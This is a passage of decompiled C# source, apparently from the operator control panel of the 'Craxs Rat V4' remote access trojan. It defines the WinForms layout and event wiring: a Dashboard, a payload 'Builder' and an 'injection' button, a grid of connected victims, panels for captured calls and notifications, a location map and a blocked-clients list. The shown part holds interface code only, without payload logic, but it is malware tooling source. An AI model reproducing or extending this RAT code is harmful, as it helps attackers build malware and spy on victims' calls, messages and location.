			this.Home_Btn.Name = "Home_Btn";
			this.Home_Btn.RectColor = Color.Black;
			this.Home_Btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.Home_Btn.RectHoverColor = Color.White;
			this.Home_Btn.RectPressColor = Color.White;
			this.Home_Btn.RectSelectedColor = Color.White;
			this.Home_Btn.ShowFocusLine = true;
			this.Home_Btn.Size = new Size(138, 54);
			this.Home_Btn.Style = UIStyle.Custom;
			this.Home_Btn.StyleCustomMode = true;
			this.Home_Btn.Symbol = 57460;
			this.Home_Btn.TabIndex = 16;
			this.Home_Btn.Text = "Dashboard";
			this.Home_Btn.TipsText = "Home";
			this.Build_btn.Cursor = Cursors.Hand;
			this.Build_btn.Dock = DockStyle.Bottom;
			this.Build_btn.FillColor = Color.Black;
			this.Build_btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.Build_btn.FillPressColor = Color.Black;
			this.Build_btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.Build_btn.Font = new Font("Roboto", 9f);
			this.Build_btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.Build_btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.Build_btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.Build_btn.Location = new Point(0, 598);
			this.Build_btn.Margin = new Padding(4);
			this.Build_btn.Name = "Build_btn";
			this.Build_btn.RectColor = Color.Black;
			this.Build_btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.Build_btn.RectHoverColor = Color.White;
			this.Build_btn.RectPressColor = Color.White;
			this.Build_btn.RectSelectedColor = Color.White;
			this.Build_btn.Size = new Size(138, 54);
			this.Build_btn.Style = UIStyle.Custom;
			this.Build_btn.Symbol = 61819;
			this.Build_btn.TabIndex = 18;
			this.Build_btn.Text = "Builder";
			this.Panel8.Dock = DockStyle.Top;
			this.Panel8.Location = new Point(0, 119);
			this.Panel8.Name = "Panel8";
			this.Panel8.Size = new Size(138, 17);
			this.Panel8.TabIndex = 39;
			this.Label1.BackColor = Color.Black;
			this.Label1.Dock = DockStyle.Top;
			this.Label1.Font = new Font("Roboto", 13f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.FromArgb(157, 5, 17);
			this.Label1.Location = new Point(0, 82);
			this.Label1.Margin = new Padding(4, 0, 4, 0);
			this.Label1.Name = "Label1";
			this.Label1.Size = new Size(138, 37);
			this.Label1.TabIndex = 38;
			this.Label1.Text = "Craxs Rat V4";
			this.PictureBox1.BackColor = Color.Black;
			this.PictureBox1.Dock = DockStyle.Top;
			this.PictureBox1.Image = Module0.LOGO;
			this.PictureBox1.Location = new Point(0, 0);
			this.PictureBox1.Margin = new Padding(4);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new Size(138, 82);
			this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
			this.PictureBox1.TabIndex = 15;
			this.PictureBox1.TabStop = false;
			this.inject_btn.Cursor = Cursors.Hand;
			this.inject_btn.Dock = DockStyle.Bottom;
			this.inject_btn.FillColor = Color.Black;
			this.inject_btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.inject_btn.FillPressColor = Color.Black;
			this.inject_btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.inject_btn.Font = new Font("Roboto", 9f);
			this.inject_btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.inject_btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.inject_btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.inject_btn.Location = new Point(0, 652);
			this.inject_btn.Margin = new Padding(4);
			this.inject_btn.Name = "inject_btn";
			this.inject_btn.RectColor = Color.Black;
			this.inject_btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.inject_btn.RectHoverColor = Color.White;
			this.inject_btn.RectPressColor = Color.White;
			this.inject_btn.RectSelectedColor = Color.White;
			this.inject_btn.Size = new Size(138, 54);
			this.inject_btn.Style = UIStyle.Custom;
			this.inject_btn.Symbol = 61671;
			this.inject_btn.TabIndex = 19;
			this.inject_btn.Text = "injection";
			this.About_btn.Cursor = Cursors.Hand;
			this.About_btn.Dock = DockStyle.Bottom;
			this.About_btn.FillColor = Color.Black;
			this.About_btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.About_btn.FillPressColor = Color.Black;
			this.About_btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.About_btn.Font = new Font("Roboto", 9f);
			this.About_btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.About_btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.About_btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.About_btn.Location = new Point(0, 706);
			this.About_btn.Margin = new Padding(4);
			this.About_btn.Name = "About_btn";
			this.About_btn.RectColor = Color.Black;
			this.About_btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.About_btn.RectHoverColor = Color.White;
			this.About_btn.RectPressColor = Color.White;
			this.About_btn.RectSelectedColor = Color.White;
			this.About_btn.Size = new Size(138, 54);
			this.About_btn.Style = UIStyle.Custom;
			this.About_btn.Symbol = 62108;
			this.About_btn.TabIndex = 21;
			this.About_btn.Text = "About";
			this.Settings_btn.Cursor = Cursors.Hand;
			this.Settings_btn.Dock = DockStyle.Bottom;
			this.Settings_btn.FillColor = Color.Black;
			this.Settings_btn.FillHoverColor = Color.FromArgb(20, 20, 20);
			this.Settings_btn.FillPressColor = Color.Black;
			this.Settings_btn.FillSelectedColor = Color.FromArgb(157, 5, 17);
			this.Settings_btn.Font = new Font("Roboto", 9f);
			this.Settings_btn.ForeColor = Color.FromArgb(157, 5, 17);
			this.Settings_btn.ForePressColor = Color.FromArgb(157, 5, 17);
			this.Settings_btn.ImageAlign = ContentAlignment.MiddleLeft;
			this.Settings_btn.Location = new Point(0, 760);
			this.Settings_btn.Margin = new Padding(4);
			this.Settings_btn.Name = "Settings_btn";
			this.Settings_btn.RectColor = Color.Black;
			this.Settings_btn.RectDisableColor = Color.FromArgb(227, 242, 253);
			this.Settings_btn.RectHoverColor = Color.White;
			this.Settings_btn.RectPressColor = Color.White;
			this.Settings_btn.RectSelectedColor = Color.White;
			this.Settings_btn.Size = new Size(138, 54);
			this.Settings_btn.Style = UIStyle.Custom;
			this.Settings_btn.Symbol = 57397;
			this.Settings_btn.TabIndex = 20;
			this.Settings_btn.Text = "Settings";
			this.RightPanel.BackColor = Color.Black;
			this.RightPanel.Cursor = Cursors.SizeWE;
			this.RightPanel.Dock = DockStyle.Right;
			this.RightPanel.Location = new Point(1594, 0);
			this.RightPanel.Margin = new Padding(4);
			this.RightPanel.Name = "RightPanel";
			this.RightPanel.Size = new Size(13, 814);
			this.RightPanel.TabIndex = 10;
			this.StatusPanel.BackColor = Color.Black;
			this.StatusPanel.Controls.Add(this.infolowtext);
			this.StatusPanel.Cursor = Cursors.SizeNS;
			this.StatusPanel.Dock = DockStyle.Bottom;
			this.StatusPanel.ForeColor = Color.White;
			this.StatusPanel.Location = new Point(0, 814);
			this.StatusPanel.Margin = new Padding(4);
			this.StatusPanel.Name = "StatusPanel";
			this.StatusPanel.Size = new Size(1607, 20);
			this.StatusPanel.TabIndex = 2;
			this.infolowtext.Cursor = Cursors.SizeNS;
			this.infolowtext.Dock = DockStyle.Fill;
			this.infolowtext.FlatStyle = FlatStyle.Flat;
			this.infolowtext.Font = new Font("Segoe UI", 9f, FontStyle.Bold);
			this.infolowtext.ForeColor = Color.Lime;
			this.infolowtext.Location = new Point(0, 0);
			this.infolowtext.Margin = new Padding(4, 0, 4, 0);
			this.infolowtext.Name = "infolowtext";
			this.infolowtext.Size = new Size(1607, 20);
			this.infolowtext.TabIndex = 4;
			this.infolowtext.Text = "Connected :";
			this.infolowtext.TextAlign = ContentAlignment.MiddleRight;
			this.ToolTip1.AutomaticDelay = 100;
			this.ToolTip1.BackColor = Color.Black;
			this.ToolTip1.ForeColor = Color.White;
			this.Timer1.Interval = 1000;
			this.notifiform.AutomaticDelay = 0;
			this.notifiform.AutoPopDelay = 5000;
			this.notifiform.BackColor = Color.Black;
			this.notifiform.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
			this.notifiform.ForeColor = Color.FromArgb(157, 5, 17);
			this.notifiform.InitialDelay = 100;
			this.notifiform.OwnerDraw = true;
			this.notifiform.ReshowDelay = 50;
			this.notifiform.TitleFont = new Font("Segoe UI", 9f, FontStyle.Bold);
			this.notifiform.ToolTipIcon = ToolTipIcon.Info;
			this.MonitorTimer.Interval = 80;
			this.mapupdater.Interval = 5000;
			this.ToolTips.BackColor = Color.Black;
			this.ToolTips.ForeColor = Color.White;
			this.ToolTips.OwnerDraw = true;
			this.ToolTips.RectColor = Color.FromArgb(157, 5, 17);
			base.AutoScaleDimensions = new SizeF(8f, 16f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			base.ClientSize = new Size(1607, 834);
			base.Controls.Add(this.Mainpanel);
			this.DoubleBuffered = true;
			this.ForeColor = Color.White;
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new Padding(4);
			this.MaximumSize = new Size(1607, 834);
			this.MinimumSize = new Size(1607, 834);
			base.Name = "CypherRat";
			base.Opacity = 0.0;
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Craxs Rat";
			base.WindowState = FormWindowState.Maximized;
			this.Mainpanel.ResumeLayout(false);
			this.DashboardPanel.ResumeLayout(false);
			((ISupportInitialize)this.ClientsWindow).EndInit();
			this.DrakeUIContextMenuStrip1.ResumeLayout(false);
			this.Panel6.ResumeLayout(false);
			((ISupportInitialize)this.TCavatar).EndInit();
			this.Panel7.ResumeLayout(false);
			this.infotitlepanel.ResumeLayout(false);
			this.infopanel.ResumeLayout(false);
			this.Panel5.ResumeLayout(false);
			this.callspanel.ResumeLayout(false);
			((ISupportInitialize)this.DGVCALLS).EndInit();
			this.mappanel.ResumeLayout(false);
			this.notifispanel.ResumeLayout(false);
			((ISupportInitialize)this.DGVNOTF).EndInit();
			this.Panel2.ResumeLayout(false);
			this.infobox.ResumeLayout(false);
			this.ReciveBox.ResumeLayout(false);
			this.SentBox.ResumeLayout(false);
			this.RecentBox.ResumeLayout(false);
			this.connectionpanel.ResumeLayout(false);
			((ISupportInitialize)this.DataLog).EndInit();
			this.ctxconnection_1.ResumeLayout(false);
			this.blockpanel.ResumeLayout(false);
			((ISupportInitialize)this.DGVblocked).EndInit();
			this.ctxconnection.ResumeLayout(false);
			this.TopPanel.ResumeLayout(false);
			this.Panel3.ResumeLayout(false);
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.StatusPanel.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x1700023B RID: 571
		// (get) Token: 0x060006EC RID: 1772 RVA: 0x000055BD File Offset: 0x000037BD
		// (set) Token: 0x060006ED RID: 1773 RVA: 0x0003CA10 File Offset: 0x0003AC10
		internal virtual NotifyIcon notfi
		{
			[CompilerGenerated]
			get
			{
				return this._notfi;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.notfi_MouseClick);
				NotifyIcon notfi = this._notfi;
				if (notfi != null)
				{
					notfi.MouseClick -= value2;
				}
				this._notfi = value;
				notfi = this._notfi;
				if (notfi != null)
				{
					notfi.MouseClick += value2;
				}
			}
		}

		// Token: 0x1700023C RID: 572
		// (get) Token: 0x060006EE RID: 1774 RVA: 0x000055C5 File Offset: 0x000037C5
		// (set) Token: 0x060006EF RID: 1775 RVA: 0x0003CA54 File Offset: 0x0003AC54
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000196 RID: 406
		// (get) Token: 0x060006F0 RID: 1776 RVA: 0x000055CD File Offset: 0x000037CD
		// (set) Token: 0x060006F1 RID: 1777 RVA: 0x0003CA98 File Offset: 0x0003AC98
		internal virtual Panel Mainpanel { get; set; }

		// Token: 0x17000197 RID: 407
		// (get) Token: 0x060006F2 RID: 1778 RVA: 0x000055D5 File Offset: 0x000037D5
		// (set) Token: 0x060006F3 RID: 1779 RVA: 0x0003CAAC File Offset: 0x0003ACAC
		internal virtual Panel TopPanel
		{
			[CompilerGenerated]
			get
			{
				return this._TopPanel;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.TopPanel_MouseDown);
				Panel topPanel = this._TopPanel;
				if (topPanel != null)
				{
					topPanel.MouseDown -= value2;
				}
				this._TopPanel = value;
				topPanel = this._TopPanel;
				if (topPanel != null)
				{
					topPanel.MouseDown += value2;
				}
			}
		}

		// Token: 0x1700023D RID: 573
		// (get) Token: 0x060006F4 RID: 1780 RVA: 0x000055DD File Offset: 0x000037DD
		// (set) Token: 0x060006F5 RID: 1781 RVA: 0x0003CAF0 File Offset: 0x0003ACF0
		internal virtual ToolTip ToolTip1 { get; set; }

		// Token: 0x17000198 RID: 408
		// (get) Token: 0x060006F6 RID: 1782 RVA: 0x000055E5 File Offset: 0x000037E5
		// (set) Token: 0x060006F7 RID: 1783 RVA: 0x0003CB04 File Offset: 0x0003AD04
		internal virtual Panel StatusPanel { get; set; }

		// Token: 0x17000199 RID: 409
		// (get) Token: 0x060006F8 RID: 1784 RVA: 0x000055ED File Offset: 0x000037ED
		// (set) Token: 0x060006F9 RID: 1785 RVA: 0x0003CB18 File Offset: 0x0003AD18
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700019A RID: 410
		// (get) Token: 0x060006FA RID: 1786 RVA: 0x000055F5 File Offset: 0x000037F5
		// (set) Token: 0x060006FB RID: 1787 RVA: 0x0003CB5C File Offset: 0x0003AD5C
		internal virtual Panel RightPanel
		{
			[CompilerGenerated]
			get
			{
				return this._RightPanel;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.RightPanel_MouseDown);
				MouseEventHandler value3 = new MouseEventHandler(this.RightPanel_MouseMove);
				MouseEventHandler value4 = new MouseEventHandler(this.RightPanel_MouseUp);
				Panel rightPanel = this._RightPanel;
				if (rightPanel != null)
				{
					rightPanel.MouseDown -= value2;
					rightPanel.MouseMove -= value3;
					rightPanel.MouseUp -= value4;
				}
				this._RightPanel = value;
				rightPanel = this._RightPanel;
				if (rightPanel != null)
				{
					rightPanel.MouseDown += value2;
					rightPanel.MouseMove += value3;
					rightPanel.MouseUp += value4;
				}
			}
		}

		// Token: 0x1700019B RID: 411
		// (get) Token: 0x060006FC RID: 1788 RVA: 0x000055FD File Offset: 0x000037FD
		// (set) Token: 0x060006FD RID: 1789 RVA: 0x0003CBE0 File Offset: 0x0003ADE0
		public virtual DataGridView DataLog
		{
			[CompilerGenerated]
			get
			{
				return this._DataLog;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DataLog_Resize);
				DataGridView dataLog = this._DataLog;
				if (dataLog != null)
				{
					dataLog.Resize -= value2;
				}
				this._DataLog = value;
				dataLog = this._DataLog;
				if (dataLog != null)
				{
					dataLog.Resize += value2;
				}
			}
		}

		// Token: 0x1700023E RID: 574
		// (get) Token: 0x060006FE RID: 1790 RVA: 0x00005605 File Offset: 0x00003805
		// (set) Token: 0x060006FF RID: 1791 RVA: 0x0003CC24 File Offset: 0x0003AE24
		internal virtual DrakeUIToolTip notifiform { get; set; }

		// Token: 0x1700019C RID: 412
		// (get) Token: 0x06000700 RID: 1792 RVA: 0x0000560D File Offset: 0x0000380D
		// (set) Token: 0x06000701 RID: 1793 RVA: 0x0003CC38 File Offset: 0x0003AE38
		internal virtual DrakeUIAvatar clearbtn
		{
			[CompilerGenerated]
			get
			{
				return this._clearbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.clearbtn_Click);
				DrakeUIAvatar clearbtn = this._clearbtn;
				if (clearbtn != null)
				{
					clearbtn.Click -= value2;
				}
				this._clearbtn = value;
				clearbtn = this._clearbtn;
				if (clearbtn != null)
				{
					clearbtn.Click += value2;
				}
			}
		}

		// Token: 0x1700019D RID: 413
		// (get) Token: 0x06000702 RID: 1794 RVA: 0x00005615 File Offset: 0x00003815
		// (set) Token: 0x06000703 RID: 1795 RVA: 0x0003CC7C File Offset: 0x0003AE7C
		internal virtual DrakeUITitlePanel DashboardPanel { get; set; }

		// Token: 0x1700019E RID: 414
		// (get) Token: 0x06000704 RID: 1796 RVA: 0x0000561D File Offset: 0x0000381D
		// (set) Token: 0x06000705 RID: 1797 RVA: 0x0003CC90 File Offset: 0x0003AE90
		internal virtual DrakeUIGroupBox RecentBox { get; set; }

		// Token: 0x1700019F RID: 415
		// (get) Token: 0x06000706 RID: 1798 RVA: 0x00005625 File Offset: 0x00003825
		// (set) Token: 0x06000707 RID: 1799 RVA: 0x0003CCA4 File Offset: 0x0003AEA4
		internal virtual DrakeUIAvatar lastclientpic { get; set; }

		// Token: 0x170001A0 RID: 416
		// (get) Token: 0x06000708 RID: 1800 RVA: 0x0000562D File Offset: 0x0000382D
		// (set) Token: 0x06000709 RID: 1801 RVA: 0x0003CCB8 File Offset: 0x0003AEB8
		internal virtual DrakeUILabel lastclienttext { get; set; }

		// Token: 0x170001A1 RID: 417
		// (get) Token: 0x0600070A RID: 1802 RVA: 0x00005635 File Offset: 0x00003835
		// (set) Token: 0x0600070B RID: 1803 RVA: 0x0003CCCC File Offset: 0x0003AECC
		internal virtual DrakeUIGroupBox SentBox { get; set; }

		// Token: 0x170001A2 RID: 418
		// (get) Token: 0x0600070C RID: 1804 RVA: 0x0000563D File Offset: 0x0000383D
		// (set) Token: 0x0600070D RID: 1805 RVA: 0x0003CCE0 File Offset: 0x0003AEE0
		internal virtual DrakeUIAvatar DrakeUIAvatar7 { get; set; }

		// Token: 0x170001A3 RID: 419
		// (get) Token: 0x0600070E RID: 1806 RVA: 0x00005645 File Offset: 0x00003845
		// (set) Token: 0x0600070F RID: 1807 RVA: 0x0003CCF4 File Offset: 0x0003AEF4
		internal virtual DrakeUILabel senttotal { get; set; }

		// Token: 0x170001A4 RID: 420
		// (get) Token: 0x06000710 RID: 1808 RVA: 0x0000564D File Offset: 0x0000384D
		// (set) Token: 0x06000711 RID: 1809 RVA: 0x0003CD08 File Offset: 0x0003AF08
		internal virtual DrakeUIGroupBox ReciveBox { get; set; }

		// Token: 0x170001A5 RID: 421
		// (get) Token: 0x06000712 RID: 1810 RVA: 0x00005655 File Offset: 0x00003855
		// (set) Token: 0x06000713 RID: 1811 RVA: 0x0003CD1C File Offset: 0x0003AF1C
		internal virtual DrakeUIAvatar DrakeUIAvatar6 { get; set; }

		// Token: 0x170001A6 RID: 422
		// (get) Token: 0x06000714 RID: 1812 RVA: 0x0000565D File Offset: 0x0000385D
		// (set) Token: 0x06000715 RID: 1813 RVA: 0x0003CD30 File Offset: 0x0003AF30
		internal virtual DrakeUILabel recvtotal { get; set; }

		// Token: 0x170001A7 RID: 423
		// (get) Token: 0x06000716 RID: 1814 RVA: 0x00005665 File Offset: 0x00003865
		// (set) Token: 0x06000717 RID: 1815 RVA: 0x0003CD44 File Offset: 0x0003AF44
		internal virtual DrakeUIGroupBox infobox { get; set; }

		// Token: 0x170001A8 RID: 424
		// (get) Token: 0x06000718 RID: 1816 RVA: 0x0000566D File Offset: 0x0000386D
		// (set) Token: 0x06000719 RID: 1817 RVA: 0x0003CD58 File Offset: 0x0003AF58
		internal virtual DrakeUILabel infotext { get; set; }

		// Token: 0x170001A9 RID: 425
		// (get) Token: 0x0600071A RID: 1818 RVA: 0x00005675 File Offset: 0x00003875
		// (set) Token: 0x0600071B RID: 1819 RVA: 0x0003CD6C File Offset: 0x0003AF6C
		internal virtual DrakeUIAvatar DrakeUIAvatar3 { get; set; }

		// Token: 0x170001AA RID: 426
		// (get) Token: 0x0600071C RID: 1820 RVA: 0x0000567D File Offset: 0x0000387D
		// (set) Token: 0x0600071D RID: 1821 RVA: 0x0003CD80 File Offset: 0x0003AF80
		internal virtual Panel infopanel { get; set; }

		// Token: 0x170001AB RID: 427
		// (get) Token: 0x0600071E RID: 1822 RVA: 0x00005685 File Offset: 0x00003885
		// (set) Token: 0x0600071F RID: 1823 RVA: 0x0003CD94 File Offset: 0x0003AF94
		internal virtual PictureBox PictureBox1
		{
			[CompilerGenerated]
			get
			{
				return this._PictureBox1;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.PictureBox1_MouseDown);
				PictureBox pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.MouseDown -= value2;
				}
				this._PictureBox1 = value;
				pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.MouseDown += value2;
				}
			}
		}

		// Token: 0x170001AC RID: 428
		// (get) Token: 0x06000720 RID: 1824 RVA: 0x0000568D File Offset: 0x0000388D
		// (set) Token: 0x06000721 RID: 1825 RVA: 0x0003CDD8 File Offset: 0x0003AFD8
		internal virtual Panel Panel3
		{
			[CompilerGenerated]
			get
			{
				return this._Panel3;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Panel3_MouseDown);
				Panel panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseDown -= value2;
				}
				this._Panel3 = value;
				panel = this._Panel3;
				if (panel != null)
				{
					panel.MouseDown += value2;
				}
			}
		}

		// Token: 0x170001AD RID: 429
		// (get) Token: 0x06000722 RID: 1826 RVA: 0x00005695 File Offset: 0x00003895
		// (set) Token: 0x06000723 RID: 1827 RVA: 0x0003CE1C File Offset: 0x0003B01C
		internal virtual Label infolowtext
		{
			[CompilerGenerated]
			get
			{
				return this._infolowtext;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.infolowtext_MouseDown);
				MouseEventHandler value3 = new MouseEventHandler(this.infolowtext_MouseMove);
				MouseEventHandler value4 = new MouseEventHandler(this.infolowtext_MouseUp);
				Label infolowtext = this._infolowtext;
				if (infolowtext != null)
				{
					infolowtext.MouseDown -= value2;
					infolowtext.MouseMove -= value3;
					infolowtext.MouseUp -= value4;
				}
				this._infolowtext = value;
				infolowtext = this._infolowtext;
				if (infolowtext != null)
				{
					infolowtext.MouseDown += value2;
					infolowtext.MouseMove += value3;
					infolowtext.MouseUp += value4;
				}
			}
		}

		// Token: 0x170001AE RID: 430
		// (get) Token: 0x06000724 RID: 1828 RVA: 0x0000569D File Offset: 0x0000389D
		// (set) Token: 0x06000725 RID: 1829 RVA: 0x0003CE98 File Offset: 0x0003B098
		internal virtual DrakeUIButtonIcon Home_Btn
		{
			[CompilerGenerated]
			get
			{
				return this._Home_Btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Home_Btn_Click);
				DrakeUIButtonIcon home_Btn = this._Home_Btn;
				if (home_Btn != null)
				{
					home_Btn.Click -= value2;
				}
				this._Home_Btn = value;
				home_Btn = this._Home_Btn;
				if (home_Btn != null)
				{
					home_Btn.Click += value2;
				}
			}
		}

		// Token: 0x170001AF RID: 431
		// (get) Token: 0x06000726 RID: 1830 RVA: 0x000056A5 File Offset: 0x000038A5
		// (set) Token: 0x06000727 RID: 1831 RVA: 0x0003CEDC File Offset: 0x0003B0DC
		internal virtual DrakeUIButtonIcon Build_btn
		{
			[CompilerGenerated]
			get
			{
				return this._Build_btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Build_btn_Click);
				DrakeUIButtonIcon build_btn = this._Build_btn;
				if (build_btn != null)
				{
					build_btn.Click -= value2;
				}
				this._Build_btn = value;
				build_btn = this._Build_btn;
				if (build_btn != null)
				{
					build_btn.Click += value2;
				}
			}
		}

		// Token: 0x170001B0 RID: 432
		// (get) Token: 0x06000728 RID: 1832 RVA: 0x000056AD File Offset: 0x000038AD
		// (set) Token: 0x06000729 RID: 1833 RVA: 0x0003CF20 File Offset: 0x0003B120
		internal virtual DrakeUIButtonIcon inject_btn
		{
			[CompilerGenerated]
			get
			{
				return this._inject_btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.inject_btn_Click);
				DrakeUIButtonIcon inject_btn = this._inject_btn;
				if (inject_btn != null)
				{
					inject_btn.Click -= value2;
				}
				this._inject_btn = value;
				inject_btn = this._inject_btn;
				if (inject_btn != null)
				{
					inject_btn.Click += value2;
				}
			}
		}

		// Token: 0x170001B1 RID: 433
		// (get) Token: 0x0600072A RID: 1834 RVA: 0x000056B5 File Offset: 0x000038B5
		// (set) Token: 0x0600072B RID: 1835 RVA: 0x0003CF64 File Offset: 0x0003B164
		internal virtual DrakeUIButtonIcon Settings_btn
		{
			[CompilerGenerated]
			get
			{
				return this._Settings_btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Settings_btn_Click);
				DrakeUIButtonIcon settings_btn = this._Settings_btn;
				if (settings_btn != null)
				{
					settings_btn.Click -= value2;
				}
				this._Settings_btn = value;
				settings_btn = this._Settings_btn;
				if (settings_btn != null)
				{
					settings_btn.Click += value2;
				}
			}
		}

		// Token: 0x170001B2 RID: 434
		// (get) Token: 0x0600072C RID: 1836 RVA: 0x000056BD File Offset: 0x000038BD
		// (set) Token: 0x0600072D RID: 1837 RVA: 0x0003CFA8 File Offset: 0x0003B1A8
		internal virtual DrakeUIButtonIcon About_btn
		{
			[CompilerGenerated]
			get
			{
				return this._About_btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.About_btn_Click);
				DrakeUIButtonIcon about_btn = this._About_btn;
				if (about_btn != null)
				{
					about_btn.Click -= value2;
				}
				this._About_btn = value;
				about_btn = this._About_btn;
				if (about_btn != null)
				{
					about_btn.Click += value2;
				}
			}
		}

		// Token: 0x170001B3 RID: 435
		// (get) Token: 0x0600072E RID: 1838 RVA: 0x000056C5 File Offset: 0x000038C5
		// (set) Token: 0x0600072F RID: 1839 RVA: 0x0003CFEC File Offset: 0x0003B1EC
		internal virtual DrakeUITitlePanel connectionpanel { get; set; }

		// Token: 0x170001B4 RID: 436
		// (get) Token: 0x06000730 RID: 1840 RVA: 0x000056CD File Offset: 0x000038CD
		// (set) Token: 0x06000731 RID: 1841 RVA: 0x0003D000 File Offset: 0x0003B200
		internal virtual DrakeUITitlePanel infotitlepanel { get; set; }

		// Token: 0x1700023F RID: 575
		// (get) Token: 0x06000732 RID: 1842 RVA: 0x000056D5 File Offset: 0x000038D5
		// (set) Token: 0x06000733 RID: 1843 RVA: 0x0003D014 File Offset: 0x0003B214
		internal virtual System.Windows.Forms.Timer MonitorTimer
		{
			[CompilerGenerated]
			get
			{
				return this._MonitorTimer;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.MonitorTimer_Tick);
				System.Windows.Forms.Timer monitorTimer = this._MonitorTimer;
				if (monitorTimer != null)
				{
					monitorTimer.Tick -= value2;
				}
				this._MonitorTimer = value;
				monitorTimer = this._MonitorTimer;
				if (monitorTimer != null)
				{
					monitorTimer.Tick += value2;
				}
			}
		}

		// Token: 0x170001B5 RID: 437
		// (get) Token: 0x06000734 RID: 1844 RVA: 0x000056DD File Offset: 0x000038DD
		// (set) Token: 0x06000735 RID: 1845 RVA: 0x0003D058 File Offset: 0x0003B258
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x170001B6 RID: 438
		// (get) Token: 0x06000736 RID: 1846 RVA: 0x000056E5 File Offset: 0x000038E5
		// (set) Token: 0x06000737 RID: 1847 RVA: 0x0003D06C File Offset: 0x0003B26C
		internal virtual Panel Panel7 { get; set; }

		// Token: 0x170001B7 RID: 439
		// (get) Token: 0x06000738 RID: 1848 RVA: 0x000056ED File Offset: 0x000038ED
		// (set) Token: 0x06000739 RID: 1849 RVA: 0x0003D080 File Offset: 0x0003B280
		internal virtual DrakeUICheckBox checkall
		{
			[CompilerGenerated]
			get
			{
				return this._checkall;
			}
			[CompilerGenerated]
			set
			{
				DrakeUICheckBox.OnValueChanged value2 = new DrakeUICheckBox.OnValueChanged(this.checkall_ValueChanged);
				DrakeUICheckBox checkall = this._checkall;
				if (checkall != null)
				{
					checkall.ValueChanged -= value2;
				}
				this._checkall = value;
				checkall = this._checkall;
				if (checkall != null)
				{
					checkall.ValueChanged += value2;
				}
			}
		}

		// Token: 0x170001B8 RID: 440
		// (get) Token: 0x0600073A RID: 1850 RVA: 0x000056F5 File Offset: 0x000038F5
		// (set) Token: 0x0600073B RID: 1851 RVA: 0x0003D0C4 File Offset: 0x0003B2C4
		internal virtual DrakeUIAvatar searchbtn
		{
			[CompilerGenerated]
			get
			{
				return this._searchbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.searchbtn_Click);
				DrakeUIAvatar searchbtn = this._searchbtn;
				if (searchbtn != null)
				{
					searchbtn.Click -= value2;
				}
				this._searchbtn = value;
				searchbtn = this._searchbtn;
				if (searchbtn != null)
				{
					searchbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001B9 RID: 441
